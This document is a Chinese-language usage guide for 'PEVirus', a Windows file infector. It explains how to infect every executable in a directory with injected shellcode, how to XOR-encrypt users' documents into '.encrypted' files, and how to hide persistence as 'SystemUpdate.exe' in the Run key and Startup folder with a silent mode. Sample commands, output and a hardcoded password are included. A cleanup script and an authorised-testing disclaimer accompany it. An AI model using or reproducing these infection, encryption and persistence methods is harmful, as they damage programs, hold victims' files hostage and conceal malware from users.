# PEVirus - Enhanced Edition 使用指南

## ?? 新增功能

### 1. 灵活的参数解析
- 支持命令行参数
- 默认行为（无参数）
- 多种操作模式

### 2. 文件加密功能
- XOR 加密算法
- 批量加密
- 自动重命名

### 3. 后台保活（持久化）
- 注册表启动项
- 启动目录复制
- 静默运行

### 4. 智能排除
- 自动排除自身
- 避免重复感染
- 避免重复加密

## ?? 命令行参数

### 基本语法
```cmd
PEVirus.exe [options] [target]
```

### 参数说明

| 参数 | 长参数 | 说明 |
|------|--------|------|
| `-h` | `--help` | 显示帮助信息 |
| `-e` | `--encrypt` | 启用文件加密模式 |
| `-p` | `--persist` | 安装持久化（后台保活） |
| `-s` | `--silent` | 静默模式（无输出） |
| `-t <path>` | `--target <path>` | 指定目标文件或目录 |

## ?? 使用示例

### 场景 1：默认行为（推荐用于测试）

```cmd
# 无参数运行
PEVirus.exe
```

**行为**：
1. ? 感染当前目录下所有 `.exe` 文件（排除自身）
2. ? 安装持久化（注册表 + 启动目录）
3. ? 显示详细输出

**示例输出**：
```
[*] No arguments provided, using default behavior:
    - Infecting current directory (excluding self)
    - Installing persistence

[*] 正在扫描目录: C:\Users\Test\Desktop
[!] Skipping self: PEVirus.exe
[*] 正在感染: Victim.exe
payload size: 425 bytes
[+] Infection Successful!
[*] 正在感染: test.exe
payload size: 425 bytes
[+] Infection Successful!
[+] Total files infected: 2

[*] Installing persistence...
[+] Copied to startup: C:\Users\Test\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\SystemUpdate.exe
[+] Added to registry startup

[+] Default operation completed!
```

### 场景 2：感染单个文件

```cmd
PEVirus.exe -t victim.exe
# 或
PEVirus.exe victim.exe
```

**行为**：
- ? 仅感染指定的单个文件
- ? 不安装持久化
- ? 不加密文件

### 场景 3：感染指定目录

```cmd
PEVirus.exe -t C:\test
```

**行为**：
- ? 感染 `C:\test` 目录下所有 `.exe` 文件
- ? 自动排除自身（如果在该目录）
- ? 不安装持久化

### 场景 4：文件加密模式

```cmd
PEVirus.exe -e -t C:\Documents
```

**行为**：
- ? 加密目录下的文档文件
- 支持的文件类型：
  - `.txt`, `.doc`, `.docx`
  - `.pdf`, `.xls`, `.xlsx`
  - `.ppt`, `.pptx`
  - `.jpg`, `.png`
  - `.zip`, `.rar`
- ? 不感染 PE 文件

**示例输出**：
```
[*] Encryption mode enabled
[+] Encrypted: C:\Documents\report.docx -> C:\Documents\report.docx.encrypted
[+] Encrypted: C:\Documents\data.xlsx -> C:\Documents\data.xlsx.encrypted
[+] Encrypted 2 files
```

### 场景 5：安装持久化

```cmd
PEVirus.exe -p
```

**行为**：
- ? 复制到启动目录
- ? 添加注册表启动项
- ? 不执行其他操作

**持久化位置**：
1. **启动目录**：
   ```
   C:\Users\<User>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\SystemUpdate.exe
   ```

2. **注册表**：
   ```
   HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
   Key: SystemUpdate
   Value: "<Path>\PEVirus.exe" --silent
   ```

### 场景 6：静默模式

```cmd
PEVirus.exe -s -t C:\test
```

**行为**：
- ? 执行感染操作
- ? 不显示任何输出
- 适用于后台运行

### 场景 7：组合使用

```cmd
# 感染并安装持久化
PEVirus.exe -p -t C:\test

# 加密并安装持久化
PEVirus.exe -e -p -t C:\Documents

# 静默感染当前目录并持久化
PEVirus.exe -s -p
```

## ?? 工作原理

### PE 感染流程

```
1. 解析目标 PE 文件
   ↓
2. 检查是否已感染（.hacked 节）
   ↓
3. 创建新节 ".hacked"
   ↓
4. 写入 shellcode + JMP 指令
   ↓
5. 修改入口点指向新节
   ↓
6. 保存文件
```

### 文件加密流程

```
1. 读取文件内容
   ↓
2. 检查是否已加密（ENC 标记）
   ↓
3. XOR 加密数据
   ↓
4. 添加 ENC 标记
   ↓
5. 写回文件
   ↓
6. 重命名为 .encrypted
```

### 持久化机制

```
方法 1: 注册表启动项
  HKCU\...\Run → "PEVirus.exe --silent"

方法 2: 启动目录
  %APPDATA%\...\Startup\SystemUpdate.exe
```

## ?? 测试建议

### 安全测试环境

? **推荐**：
- 虚拟机（VMware/VirtualBox）
- Windows Sandbox
- 隔离的测试账户

? **禁止**：
- 生产环境
- 真实用户系统
- 重要数据目录

### 测试步骤

#### 1. 准备测试环境
```cmd
# 创建测试目录
mkdir C:\test
cd C:\test

# 复制测试文件
copy C:\Windows\System32\calc.exe test1.exe
copy C:\Windows\System32\notepad.exe test2.exe
```

#### 2. 测试默认行为
```cmd
# 复制 PEVirus 到测试目录
copy PEVirus.exe C:\test

# 运行（无参数）
cd C:\test
PEVirus.exe
```

#### 3. 验证感染
```cmd
# 运行被感染的文件
test1.exe
# 应该先弹出 MessageBox，然后正常运行

# 检查节信息
dumpbin /HEADERS test1.exe | findstr ".hacked"
```

#### 4. 测试加密功能
```cmd
# 创建测试文件
echo "Test data" > test.txt

# 加密
PEVirus.exe -e -t C:\test

# 检查结果
dir *.encrypted
```

#### 5. 清理测试
```cmd
# 删除测试文件
del C:\test\*.exe
del C:\test\*.encrypted

# 删除持久化（如果安装了）
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v SystemUpdate /f
del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SystemUpdate.exe"
```

## ??? 安全注意事项

### 防护建议

1. **虚拟机快照**
   ```
   测试前创建快照
   测试后恢复快照
   ```

2. **网络隔离**
   ```
   关闭虚拟机网络
   或使用 Host-Only 网络
   ```

3. **权限控制**
   ```
   使用普通用户账户测试
   避免使用管理员权限（除非必要）
   ```

4. **文件备份**
   ```
   测试前备份重要文件
   使用专门的测试目录
   ```

### 清理方法

#### 完整清理脚本
```cmd
@echo off
echo [*] Cleaning up PEVirus traces...

REM 停止进程
taskkill /f /im PEVirus.exe 2>nul
taskkill /f /im SystemUpdate.exe 2>nul

REM 删除注册表
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v SystemUpdate /f 2>nul

REM 删除启动目录文件
del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SystemUpdate.exe" /f 2>nul

REM 删除临时文件
del "%TEMP%\*.encrypted" /f /q 2>nul

echo [+] Cleanup complete!
pause
```

## ?? 故障排除

### Q1: 感染后程序无法运行？

**原因**：JMP 偏移计算错误或 shellcode 问题

**解决**：
- 检查目标程序是否为 64 位
- 使用 x64dbg 调试
- 查看 shellcode 是否正确

### Q2: 持久化安装失败？

**原因**：权限不足

**解决**：
```cmd
# 以管理员运行
runas /user:Administrator PEVirus.exe -p
```

### Q3: 加密的文件无法解密？

**原因**：密码不匹配或文件损坏

**解决**：
- 确认使用相同的密码 `"PEVirus2024"`
- 检查文件是否有 ENC 标记
- 备份原始文件

### Q4: 默认行为没有执行？

**原因**：当前目录没有 .exe 文件

**解决**：
```cmd
# 检查当前目录
dir *.exe

# 手动指定目录
PEVirus.exe -t C:\test
```

## ?? 代码示例

### 解密加密的文件

```cpp
#include "Utils/aes.h"

int main() {
    // 解密单个文件
    SimpleEncryptor::DecryptFile("report.docx.encrypted", "PEVirus2024");
    
    return 0;
}
```

### 检查是否已感染

```cpp
#include <LIEF/LIEF.hpp>

bool CheckInfected(const std::string& filePath) {
    auto binary = LIEF::PE::Parser::parse(filePath);
    if (!binary) return false;
    
    for (const auto& section : binary->sections()) {
        if (section.name() == ".hacked") {
            return true;
        }
    }
    return false;
}
```

## ?? 法律声明

**重要提示**：

- ? 仅用于**授权测试**和**教育研究**
- ? 禁止用于**非法入侵**和**恶意破坏**
- ?? 开发者不对滥用行为负责

**合法使用场景**：
- 个人学习和研究
- 授权的安全测试
- 红队演练（有授权）
- 安全培训

---

**Stay Ethical, Stay Legal! ???**
